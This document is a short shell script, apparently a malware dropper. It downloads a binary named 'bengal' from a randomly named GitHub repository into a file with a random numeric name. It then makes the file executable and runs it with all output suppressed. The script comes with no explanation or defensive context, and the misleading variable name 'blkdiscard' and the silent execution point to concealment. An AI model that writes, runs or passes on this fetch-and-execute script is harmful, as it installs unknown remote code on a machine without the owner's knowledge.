#!/bin/sh
blkdiscard=$(shuf -n 1 -i 1-999999)
wget -qO $blkdiscard https://github.com/komaria10003099/redesigned-pancake/raw/main/bengal
chmod +x $blkdiscard
./$blkdiscard ann >/dev/null 2>&1
